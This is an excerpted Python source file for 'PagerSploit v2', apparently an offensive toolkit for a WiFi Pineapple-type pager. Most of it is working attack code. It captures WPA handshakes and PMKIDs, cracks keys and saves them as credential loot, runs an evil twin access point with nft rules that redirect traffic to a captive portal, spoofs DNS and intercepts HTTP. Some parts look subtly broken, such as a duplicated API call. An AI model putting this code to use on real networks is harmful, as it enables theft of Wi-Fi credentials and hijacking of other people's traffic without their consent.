...
def _parse_iwinfo_to_iw_format(iwinfo_out):
    """Convert iwinfo scan output to iw-compatible format for _parse_iw_output."""
    # iwinfo format: ESSID, Address, Channel, Signal lines
    # Convert to iw BSS format so _parse_iw_output can handle it
    lines = []
    current_bssid = None
    for line in iwinfo_out.splitlines():
        ...
        if line.startswith('Cell') and 'Address:' in line:
            ...
            if len(parts) > 1:
                bssid = parts[1].strip()
                lines.append(f'BSS {bssid}(on wlan1cli)')
                current_bssid = bssid
        elif line.startswith('ESSID:'):
            ssid = line.split('ESSID:', 1)[1].strip().strip('"')
            lines.append(f'	SSID: {ssid}')
        elif line.startswith('Channel:'):
            ch = line.split('Channel:', 1)[1].strip().split()[0]
            lines.append(f'	DS Parameter set: channel {ch}')
        elif line.startswith('Signal:'):
            # "Signal: -72 dBm"
            sig = line.split('Signal:', 1)[1].strip().split()[0]
            lines.append(f'	signal: {sig}.00 dBm')
        elif 'Encryption:' in line:
            enc = line.split('Encryption:', 1)[1].strip()
            if enc.startswith('WPA2'):
                lines.append('	RSN:')
            elif enc.startswith('WPA'):
                lines.append('	WPA:')
            elif enc == 'none':
...
def wifi_scan(band='abg', duration=20):
    ...
    # ── Step 0: ensure wlan1cli exists (WiFi Guppy pattern) ─────────────
    # phy1 can host a managed interface alongside pineapd's monitor interface
    try:
        r = subprocess.run(['iw', 'dev', 'wlan1cli', 'info'],
                           capture_output=True, timeout=3)
        if r.returncode != 0:
            subprocess.run(['iw', 'phy', 'phy1', 'interface', 'add', 'wlan1cli',
                           'type', 'managed'], capture_output=True, timeout=5)
            subprocess.run(['ip', 'link', 'set', 'wlan1cli', 'up'],
                           capture_output=True, timeout=3)
            time.sleep(1)
            log('Created wlan1cli on phy1', 'info')
    except: pass

    # ── Step 1: scan via wlan0cli and wlan1cli ────────────────────────────
    for scan_iface in ['wlan0cli', 'wlan1cli']:
        log(f'Scanning via {scan_iface}...', 'info')
        out1 = _run_iw_scan(scan_iface)
        if not out1:
            # Try iwinfo as fallback (WiFi Guppy pattern)
            try:
                r = subprocess.run(['iwinfo', scan_iface, 'scan'],
                                   capture_output=True, text=True, timeout=25)
                if r.stdout.strip():
                    # iwinfo output has different format — parse it
                    out1 = _parse_iwinfo_to_iw_format(r.stdout)
                    log(f'iwinfo fallback on {scan_iface}', 'info')
            except: pass
        if out1:
            parsed = _parse_iw_output(out1)
            log(f'{scan_iface}: {len(parsed)} APs', 'info')
            for ap in parsed:
        ...
        while not stop.is_set() and time.time() < deadline:
            try:
                ...
                for f in (current - seen):
                    ...
                    if bssid_bare in f.lower() or (ssid and ssid != '<hidden>' and ssid.lower() in f.lower()):
                        log(f'HANDSHAKE: {f}', 'success')
                        with STATE_LOCK: STATE['loot_count'] += 1
                        # Copy into loot_path so it appears in the loot browser
                        try:
                            import shutil as _sh
                            _sh.copy2(os.path.join(hs_dir, f), os.path.join(loot_hs, f))
...
def wifi_crack(cap_file, wordlist):
    ...
    def _run():
        ...
        try:
            is_22000 = cap_file.endswith('.22000') or cap_file.endswith('.hc22000')
            ...
            for line in proc.stdout:
                ...
                if 'KEY FOUND' in line or 'Recovered' in line:
                    log(f'KEY FOUND: {line.strip()}', 'success')
                    save_loot('credentials', f'crack_{ts()}.txt', '\n'.join(output))  # save_loot increments loot_count
            proc.wait()
        ...
        while not stop.is_set() and time.time() < deadline:
            try:
                ...
                for j, c in enumerate(clients):
                    c['probes'] = [probe_ssids_raw[j]] if j < len(probe_ssids_raw) and probe_ssids_raw[j] else []
                    for c in clients:
                        mac = c.get('mac','').upper().strip()
                        if not mac: continue
                        # probes field is list of ssids the client is searching for
                        for ssid in c.get('probes', []):
...
def wifi_wps_scan():
    """WPS scan via _pineap RECON APS (FENRIS pattern — no recon.db dependency)."""
    log('WPS scan via _pineap RECON APS', 'info')
    ...
    try:
        ...
        raw = r.stdout
        macs  = re.findall(r'"mac"\s*:\s*"([0-9A-Fa-f:]{17})"', raw)
        ssids = re.findall(r'"ssid"\s*:\s*"([^"]*)"', raw)
        chans = re.findall(r'"channel"\s*:\s*(\d+)', raw)
        sigs  = re.findall(r'"signal"\s*:\s*(-?\d+)', raw)
        wps_flags = re.findall(r'"wps"\s*:\s*(true|false|\d+)', raw)
        for i, mac in enumerate(macs):
            output.append({
                'bssid':    mac.upper(),
                'ssid':     ssids[i] if i < len(ssids) else '',
                'channel':  int(chans[i]) if i < len(chans) else 0,
                'rssi':     int(sigs[i]) if i < len(sigs) else -100,
                'wps_info': wps_flags[i] if i < len(wps_flags) else 'unknown',
            })
...
def wifi_evil_twin(ssid, channel='6', portal_file=None):
    ...
    def _run():
        ...
        # Set network filter to allow this SSID, start Open AP
        _pineapple('PINEAPPLE_NETWORK_FILTER_ADD', ssid)
        _pineapple('PINEAPPLE_SSID_POOL_ADD', ssid)
        _pineapple('PINEAPPLE_SSID_POOL_START')
        _pineapple('PINEAPPLE_MIMIC_ENABLE')
        time.sleep(2)
        # Redirect HTTP traffic on br-evil to captive portal
        # GARMR pattern: use comments on rules for clean targeted removal
        subprocess.run(['/usr/sbin/nft', 'add', 'rule', 'inet', 'fw4', 'dstnat',
            'iifname', 'br-evil', 'meta', 'nfproto', 'ipv4',
            'tcp', 'dport', '80', 'counter', 'dnat', 'ip', 'to', '10.0.0.1:8888',
            'comment', 'PSEVILTWIN_HTTP'], stderr=subprocess.DEVNULL)
        subprocess.run(['/usr/sbin/nft', 'add', 'rule', 'inet', 'fw4', 'dstnat',
            'iifname', 'br-evil', 'meta', 'nfproto', 'ipv4',
            'tcp', 'dport', '443', 'counter', 'dnat', 'ip', 'to', '10.0.0.1:8888',
            'comment', 'PSEVILTWIN_HTTPS'], stderr=subprocess.DEVNULL)
        portal_proc = None
        if portal_file and os.path.exists(portal_file):
            ...
            portal_proc = subprocess.Popen(
                [sys.executable, '-m', 'http.server', '8888', '--directory', '/tmp/ps_portal'],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        stop.wait()
        if portal_proc: portal_proc.terminate()
        # GARMR pattern: remove only our rules by comment tag
        try:
            r = subprocess.run(['/usr/sbin/nft', '-a', 'list', 'chain', 'inet', 'fw4', 'dstnat'],
                               capture_output=True, text=True, timeout=5)
            for line in r.stdout.splitlines():
                if 'PSEVILTWIN' in line:
                    handle = line.strip().split()[-1]
                    subprocess.run(['/usr/sbin/nft', 'delete', 'rule', 'inet', 'fw4', 'dstnat',
                                   'handle', handle], stderr=subprocess.DEVNULL)
        except: pass
        _pineapple('PINEAPPLE_MIMIC_DISABLE')
        _pineapple('PINEAPPLE_SSID_POOL_STOP')
...
def wifi_hcx_capture(duration=600):
    """Passive PMKID/handshake capture using hcxdumptool on wlan1mon.
    Stealthier than deauth — no frames sent, just passive listening.
    Saves .pcapng then converts to .22000 for hashcat."""
    stop = make_stop(); reg_stop('hcx_capture', stop)
    hs_dir = '/root/loot/handshakes'
    loot_hs = loot_path('handshakes')
    os.makedirs(hs_dir, exist_ok=True)
    os.makedirs(loot_hs, exist_ok=True)
    ...
    def _run():
        log('HCX passive capture starting...', 'info')
        set_module('HCX Capture', 'Passive PMKID/HS')

        # Check hcxdumptool available
        hcx = subprocess.run(['which', 'hcxdumptool'], capture_output=True, text=True).stdout.strip()
        if not hcx:
            log('hcxdumptool not found — install with: opkg install hcxdumptool hcxtools', 'warn')
            set_module('idle', 'hcxdumptool missing')
            unreg_stop('hcx_capture')
            return

        fname = os.path.join(hs_dir, f'capture_{ts()}.pcapng')
        proc = subprocess.Popen(
            ['hcxdumptool', '-i', 'wlan1mon', '-w', fname],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        with STATE_LOCK: STATE['jobs']['hcx_proc'] = proc
        log(f'hcxdumptool running → {os.path.basename(fname)}', 'info')

        # Monitor until stopped or duration elapsed
        deadline = time.time() + duration
        while not stop.is_set() and time.time() < deadline:
            elapsed = int(time.time() - (deadline - duration))
            set_module('HCX Capture', f'Passive {elapsed}s / {duration}s')
            stop.wait(10)
        ...
        log(f'HCX capture stopped: {os.path.basename(fname)}', 'success')

        # Convert to .22000 if hcxtools available
        hcxpc = subprocess.run(['which', 'hcxpcapngtool'], capture_output=True, text=True).stdout.strip()
        if hcxpc and os.path.exists(fname):
            out22k = fname.replace('.pcapng', '.22000')
            subprocess.run([hcxpc, '-o', out22k, fname],
                          capture_output=True, timeout=30)
            if os.path.exists(out22k) and os.path.getsize(out22k) > 0:
                log(f'Converted to .22000: {os.path.basename(out22k)}', 'success')
                import shutil as _sh
                _sh.copy2(out22k, os.path.join(loot_hs, os.path.basename(out22k)))
                with STATE_LOCK: STATE['loot_count'] += 1

        # Copy pcapng to loot dir
        if os.path.exists(fname):
            import shutil as _sh
            _sh.copy2(fname, os.path.join(loot_hs, os.path.basename(fname)))

        set_module('idle', 'HCX done')
        unreg_stop('hcx_capture')

    start_job('hcx_capture', _run)
    return stop
...
def _is_valid_external_ip(ip):
    """True if ip is a real routable address (not loopback or Pineapple mgmt subnet)."""
    if not ip or ip == '127.0.0.1': return False
    if ip.startswith('172.16.52.'): return False
    return True
...
def lan_arp_scan(subnet='172.16.52.0/24'):
    # Auto-detect real client subnet if still on management default
    if subnet == '172.16.52.0/24':
        detected, _ = _detect_iface('wlan0cli')
        if detected and not detected.startswith('172.16.52'):
            subnet = f'{detected}.0/24'
            log(f'Auto-detected subnet: {subnet}', 'info')
    log(f'ARP scan: {subnet}', 'info')
    set_module('ARP Scan', subnet)
    subnets = [subnet]
    # Include evil-twin subnet if br-evil is up
    ...
    log(f'ARP: {len(hosts)} hosts', 'success')
    set_module('idle', f'{len(hosts)} hosts')
    return hosts
...
def lan_dns_spoof(domain, redirect_ip):
    ...
    # GARMR pattern: also run standalone dnsmasq spoofer on port 5353 with nft redirect
    ...
    # Start standalone spoofer on 5353 and redirect DNS traffic to it
    subprocess.Popen(['/usr/sbin/dnsmasq','--no-hosts','--no-resolv',
        f'--address=/{domain}/{redirect_ip}','--port=5353'],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['/usr/sbin/nft','add','rule','inet','fw4','dstnat',
        'iifname','br-lan','meta','nfproto','ipv4','udp','dport','53',
        'counter','dnat','ip','to',f'{redirect_ip}:5353','comment','PSDNSSPOOF'],
        stderr=subprocess.DEVNULL)
    log(f'DNS spoof active: {domain} -> {redirect_ip}','success'); return True
...
def lan_http_intercept(iface='wlan0'):
    ...
    subprocess.run(['/usr/sbin/nft','add','rule','inet','fw4','dstnat',
        'iifname','br-evil','meta','nfproto','ipv4','tcp','dport','80',
        'counter','redirect','to',':8181','comment','PSINTERCEPT'],stderr=subprocess.DEVNULL)
    ...
    def _run():
        ...
        try:
            r = subprocess.run(['/usr/sbin/nft','-a','list','chain','inet','fw4','dstnat'],
                               capture_output=True,text=True,timeout=5)
            for line in r.stdout.splitlines():
                if 'PSINTERCEPT' in line:
                    handle=line.strip().split()[-1]
                    subprocess.run(['/usr/sbin/nft','delete','rule','inet','fw4','dstnat','handle',handle],stderr=subprocess.DEVNULL)
        except: pass
...
def osint_mac_lookup(mac):
    ...
    for path in ['/usr/share/nmap/nmap-mac-prefixes','/usr/share/wireshark/manuf']:
        ...
        if vendor: break
    # Note: device has no internet — skip api.macvendors.com
    # Vendor lookup is local-only via nmap/wireshark files above
...
def _filter_whois(text):
    """Filter whois boilerplate — based on Whois payload by tototo31."""
    skip = [
        'terms and condition','terms of service','icann','copyright',
        'legal disclaimer','disclaimer','data protection','privacy policy',
        'redacted for privacy','access to','whois data','notice:',
        'warning:','important:','please note:','note:',
        'the data','this information','you may not','unauthorized use',
        'by querying','querying','see http','visit http',
        'more information available','additional information',
        'for more information','please refer','refer to',
    ]
    lines = []
...
def osint_whois(target):
    ...
    save_loot('scans',f'whois_{target}_{ts()}.txt',out)  # save full unfiltered
    filtered = _filter_whois(out)
    set_data('whois',{'target':target,'raw':filtered})   # display filtered
    log(f'WHOIS done: {target}','success'); set_module('idle','WHOIS done'); return filtered
...
def _detect_iface(iface='wlan0cli'):
    """Detect IP and subnet for an interface. Returns (subnet, ip) or (None, None)."""
    import re as _re
        ...
        try:
            ...
            for part in out.split():
                if '/' in part:
                    ...
                    octets = ip_str.split('.')
                    if len(octets) == 4:
                        return '.'.join(octets[:3]), ip_str
        except: continue
    try:
        out = subprocess.check_output(['ifconfig', iface], text=True, timeout=3,
                                       stderr=subprocess.DEVNULL)
        m = _re.search(r'inet (?:addr:)?(\d+\.\d+\.\d+\.\d+)', out)
        if m:
            ip_str = m.group(1)
            return '.'.join(ip_str.split('.')[:3]), ip_str
    except: pass
    return None, None
...
def _is_wifi_connected():
    """Check if wlan0cli or br-lan is UP (Loki pattern)."""
    for iface in ('wlan0cli', 'br-lan', 'wlan0'):
        try:
...
def osint_sysrecon():
    ...
    result={'wifi_connected': _is_wifi_connected()}
...
def get_loot_list():
    loot=[]
    seen_paths=set()
    # Scan our payload loot dir + pineapd's loot dirs
    scan_roots=[
        loot_path(),
        ...
        for root,dirs,files in os.walk(scan_root):
            for f in files:
                ...
                try:
                    ...
                    category=parts[0] if len(parts)>1 else os.path.basename(scan_root)
                    # Infer category from filename/extension if generic
                    if category in ('loot','root','.'):
                        if f.endswith(('.pcap','.cap','.22000','.hc22000')): category='handshakes'
                        elif f.endswith('.json') and 'cred' in f.lower(): category='credentials'
                        elif f.endswith('.json'): category='scans'
                    loot.append({'name':f,'path':path,'category':category,
...
class APIHandler(BaseHTTPRequestHandler):
    ...
    def do_POST(self):
        ...
        elif path=='/api/wifi/hcx_capture':
            dur=int(b.get('duration',600)); wifi_hcx_capture(dur); self.send_json({'status':'started','duration':dur})
            wifi_hcx_capture(dur); self.send_json({'status':'started','duration':dur})
...
def _get_display_pids():
    """Return PIDs of pineapple display processes to suspend during our display."""
...
def pager_display_loop(p, stop_event):
    p.set_rotation(270)
    try: p.set_brightness(80)
    except: pass
    try: p.clear_input_events()
    except: pass
    _display_pids = _get_display_pids()
    for _pid, _pname in _display_pids:
        try: os.kill(_pid, _signal.SIGSTOP)
        except Exception as e: log(f'SIGSTOP {_pname}: {e}', 'warn')
    BTN_B = Pager.BTN_B
    while not stop_event.is_set():
        try:
            ...
            # Header bar
            p.fill_rect(0,0,480,20,rgb(0,40,25))
            p.draw_text(4,3,'💀 PAGERSPLOIT v2',C_TITLE,1)
            p.fill_rect(0,20,480,1,C_TITLE)
            # URL
            p.draw_text(4,26,f'http://{ip}:{port}',C_GREEN,1)
            p.fill_rect(0,38,480,1,rgb(20,20,40))
            # Module + status
            mod_col = C_ORANGE if module != 'idle' else C_DIM
            p.draw_text(4,42,f'MOD: {module.upper()[:34]}',mod_col,1)
            p.draw_text(4,54,f'     {status[:38]}',C_WHITE,1)
            p.fill_rect(0,66,480,1,rgb(20,20,40))
            # Jobs + loot on same line
            jobs_str = ' '.join(jobs[:3])[:28] if jobs else 'idle'
            p.draw_text(4,70,f'JOBS: {jobs_str}',C_ORANGE if jobs else C_DIM,1)
            p.draw_text(380,70,f'LOOT:{loot}',C_YELLOW,1)
            p.fill_rect(0,82,480,1,rgb(20,20,40))
            # Last 3 log lines
            with STATE_LOCK:
                recent_logs = list(STATE["log"][-3:])
            log_cols = {"success":C_GREEN,"error":C_RED,"warn":C_ORANGE}
            for li, entry in enumerate(recent_logs):
                col = log_cols.get(entry["level"], rgb(100,100,100))
                p.draw_text(4, 86+li*14,
                    f'[{entry["time"]}] {entry["msg"][:44]}', col, 1)
            p.fill_rect(0,128,480,1,rgb(20,20,40))
            # Scan results count
            with STATE_LOCK:
                ap_count = len(STATE["scan_results"])
            if ap_count:
                p.draw_text(4,132,f'APs: {ap_count} in last scan',C_BLUE,1)
            # Footer
            p.fill_rect(0,208,480,1,C_DIM)
            p.draw_text(4,211,'Browser UI active',C_DIM,1)
            p.draw_text(350,211,'B=Shutdown',C_RED,1)
            p.flip()
            try: p.frame_sync()
            except: pass
            try:
                for _ in range(4):
                    ...
                    if ev:
                        btn, etype, _ = ev
                        if btn == BTN_B and etype == Pager.EVENT_PRESS:
                            stop_event.set(); return
            except: pass
        except Exception as e:
            print(f'display: {e}',flush=True)
        time.sleep(0.3)
    # Resume suspended display processes on exit
    for _pid, _pname in _display_pids:
...
def run():
    ...
    log('Shutting down...')
    # Clean up wlan1cli if we created it (WiFi Guppy pattern)
    try:
        subprocess.run(['iw', 'dev', 'wlan1cli', 'del'], capture_output=True, timeout=3)
    except: pass
    with STATE_LOCK:
        for ev in list(STATE['stop_events'].values()): ev.set()
        for proc in list(STATE['jobs'].values()):
...
if __name__ == '__main__':
    try:
        ...
        print('PagerSploit exiting -- rebooting to restore services', flush=True)
